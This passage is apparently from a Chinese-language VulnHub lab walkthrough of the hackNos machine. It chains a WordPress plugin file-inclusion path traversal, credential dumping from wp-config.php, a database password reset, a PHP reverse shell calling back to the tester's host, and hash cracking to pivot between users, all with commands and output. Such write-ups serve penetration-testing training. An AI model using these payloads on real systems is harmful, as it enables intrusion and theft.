http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css, Match: &#x27;</span>Version: 1.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:04 &lt;=========================================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==============================================================================================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Thu Dec 19 03:35:57 2019</span></span><br><span class="line"><span class="string">[+] Requests Done: 23078</span></span><br><span class="line"><span class="string">[+] Cached Requests: 46</span></span><br><span class="line"><span class="string">[+] Data Sent: 5.699 MB</span></span><br><span class="line"><span class="string">[+] Data Received: 3.448 MB</span></span><br><span class="line"><span class="string">[+] Memory used: 239.552 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:49</span></span><br></pre></td></tr></table></figure>

<p>网上搜索gracemedia-media-player插件发现存在本地文件包含漏洞，参考文章<span class="exturl" data-url="aHR0cHM6Ly9jeHNlY3VyaXR5LmNvbS9pc3N1ZS9XTEItMjAxOTAzMDExMw==">WordPress GraceMedia Media Player 1.0 Local File Inclusion<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash </span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin </span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin </span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin </span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync </span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin </span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin </span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin </span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin </span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin </span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin </span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin </span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin </span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin </span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin </span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin </span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin </span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin </span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin </span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin </span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin </span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin </span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin </span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/<span class="literal">false</span> </span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin </span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin </span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin </span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/<span class="literal">false</span> </span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin </span><br><span class="line">rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash </span><br><span class="line">mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span> </span><br><span class="line">flag:<span class="variable">$1</span><span class="variable">$flag</span><span class="variable">$vqjCxzjtRc7PofLYS2lWf</span>/:1001:1003::/home/flag:/bin/rbash</span><br></pre></td></tr></table></figure>

<p>在此找到flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/,将$1$flag$vqjCxzjtRc7PofLYS2lWf/解密得到结果topsecret</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub75.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub74.jpg"></p>
<p>然后使用flag/topsecret连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh flag@192.168.56.101</span></span><br><span class="line">flag@192.168.56.101<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information disabled due to load higher than 4.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5 packages can be updated.</span></span><br><span class="line"><span class="string">0 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Dec 19 09:18:02 2019 from 192.168.56.102</span></span><br><span class="line"><span class="string">Could not chdir to home directory /home/flag: No such file or directory</span></span><br><span class="line"><span class="string">flag@hacknos:/$ id</span></span><br><span class="line"><span class="string">uid=1001(flag) gid=1003(flag) groups=1003(flag)</span></span><br><span class="line"><span class="string">flag@hacknos:/$ whoami</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">flag@hacknos:/$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">flag@hacknos:/$</span></span><br></pre></td></tr></table></figure>

<h3 id="找第一个flag"><a href="#找第一个flag" class="headerlink" title="找第一个flag"></a>找第一个flag</h3><p>继续从之前得到的ssh用户的flag账号开始入手getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ ls /var/www/html/tsweb/</span><br><span class="line">index.php    readme.html      wp-admin            wp-comments-post.php  wp-config-sample.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php</span><br><span class="line">license.txt  wp-activate.php  wp-blog-header.php  wp-config.php         wp-content            wp-includes  wp-load.php        wp-mail.php   wp-signup.php    xmlrpc.php</span><br></pre></td></tr></table></figure>
<p>查看配置文件得到数据库的账号密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ cat /var/www/html/tsweb/wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>wpuser<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>hackNos-2.com<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">tsweb:</span><br><span class="line">define( <span class="string">&#x27;WP_SITEURL&#x27;</span>, <span class="string">&#x27;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/tsweb&#x27;</span>);</span><br><span class="line">define( <span class="string">&#x27;WP_HOME&#x27;</span>, <span class="string">&#x27;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/tsweb&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;Z ly&#125;&#125;yxO6baps19c+.Ze(sw:r$o1M.oFLN]1vwc,pkQ8l&#123;o`6%w8u*c`4#O&gt;[4S&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;lGjW6&#125;I8iVCK]/&lt;;cfBh`c[yB$^XIbt(m7%d-;kvA4LW&lt;qAgxNZsw3ogYw8&amp;Vp&lt;1&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;ntPjJGZO55`]ki&gt;qpn/np9(1uN;kA]-NKM&lt;&amp;g2HV(6&gt;IqG[^z&#125;^kMl&amp; &#125;FA#* Y#&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;Sd]xrTb,rC(s#-m.A|pExO4wJv$G|RjjVNR&#125;WPjj;T)uTGhLfsDt=4vHPo3lb./M&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;$EM:;(zkTmf6qvF3rU=|&#123;WhROYu7h.fIwB(Zmj8b17+OOPSebjm&amp;u&lt;~]xv_`eHR`&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;:lDagF8+F*&#123;wa7~Ap+J^d,aFhV*)j;&lt;&#123;T!&lt;[(X!C5~ZE;,B[v]uyJs7Df)G&#123;CL~2&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;Yh04TE3)wNX+H**.2UgS?E=&#125;2 6B*WPk&gt;kd$Fb.&amp;&amp;~J3UL^f+fL|IsM&#125;uh)&lt;O!RS&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;|Nmraflo$=2t!/,=oy;.,4nK43OwzrVX*H:KdVu$myoQ@VP^H.BP#pV8905gjj&#125;s&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br></pre></td></tr></table></figure>

<p>very nice，使用以下命令连接数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ mysql -h localhost -uwpuser -phackNos-2.com                                                                                                                                                                                </span><br><span class="line">mysql: [Warning] Using a password on the <span class="built_in">command</span> line interface can be insecure.                                                                                                                                                           </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                                                                                                                                  </span><br><span class="line">Your MySQL connection id is 18                                                                                                                                                                                                             </span><br><span class="line">Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its                                                                                                                                                                          </span><br><span class="line">affiliates. Other names may be trademarks of their respective                                                                                                                                                                              </span><br><span class="line">owners.                                                                                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.                                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>成功连接数据库，接下来查看wordpress数据库中的数据表并且查看后台user用户的密码的hash值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | <span class="variable">$P</span><span class="variable">$B</span>.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/ | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>我试了一下将$P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/解密，发现无法解密，使用下面的命令修改user的密码成为user。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; update wp_users <span class="built_in">set</span> user_pass=md5(<span class="string">&quot;user&quot;</span>) <span class="built_in">where</span> user_login=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                        | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | ee11cbb19052e40b07aac0ca060c23ee | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | <span class="variable">$P</span><span class="variable">$BRis7BEtqoG2Rvm0bIbgz</span>.c1fl79YI. | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>$P$BRis7BEtqoG2Rvm0bIbgz.c1fl79YI.解密出来结果就是user,修改成功,登录后台.</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub76.jpg"></p>
<p>将php reverse shell中的ip修改成kali端监听的ip，然后进入wordpress后台的模板修改界面，将<br>readme.txt文件内的内容改为php reverse shell木马中的内容,然后访问readme.txt文件发现成功修改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.56.102&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 5566;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub77.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub78.jpg"></p>
<p>然后利用之前的LFI漏洞包含该txt文件，然后kali端监听</p>
<p>浏览器执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../var/www/html/tsweb/wp-content/themes/twentytwenty/readme.txt</span><br></pre></td></tr></table></figure>

<p>kali端成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 49214</span><br><span class="line">Linux hacknos 4.15.0-70-generic <span class="comment">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 03:45:19 up  1:45,  2 users,  load average: 0.06, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">flag     pts/0    192.168.56.102   02:04   13:38   0.03s  0.03s -rbash</span><br><span class="line">flag     pts/1    192.168.56.102   02:11   43:03   0.02s  0.01s mysql -h localhost -uwpuser -px xxxxxxxxxxx</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@hacknos:/var/www/html/tsweb$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">index.php        wp-blog-header.php    wp-cron.php        wp-mail.php</span></span><br><span class="line"><span class="string">license.txt      wp-comments-post.php  wp-includes        wp-settings.php</span></span><br><span class="line"><span class="string">readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php</span></span><br><span class="line"><span class="string">wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php</span></span><br><span class="line"><span class="string">wp-admin         wp-content            wp-login.php       xmlrpc.php</span></span><br></pre></td></tr></table></figure>

<ul>
<li>注意：</li>
</ul>
<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这条命令很重要，运行后将能获得一个可交互的pty的shell,不运行的话很多命令无法执行。</p>
<p>进入到/var/backups/passbkp目录下查看md5-hash的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hacknos:/var/backups/passbkp$ cat md5-hash</span><br><span class="line">cat md5-hash</span><br><span class="line"><span class="variable">$1</span><span class="variable">$rohit</span><span class="variable">$01Dl0NQKtgfeL08fGrggi0</span></span><br></pre></td></tr></table></figure>

<p>解密hash值得到!%hack41</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub79.jpg"></p>
<p>ssh登录rohit用户，找到第一个flag,user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">rohit@hacknos:~$ cat user.txt</span><br><span class="line"><span class="comment">############################################ </span></span><br><span class="line"> __    __   _______   ______    ______             </span><br><span class="line">/  |  /  | /       | /      \  /      \   </span><br><span class="line">$$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |</span><br><span class="line">$$ |  $$ |$$      \ $$    $$ |$$ |  </span><br><span class="line">$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |       </span><br><span class="line">$$    $$/ /     $$/ $$       |$$ |           </span><br><span class="line"> $$$$$$/  $$$$$$$/   $$$$$$$/ $$/       </span><br><span class="line">                                                                                       </span><br><span class="line">                                                                                       </span><br><span class="line">                                                                                       </span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br></pre></td></tr></table></figure>

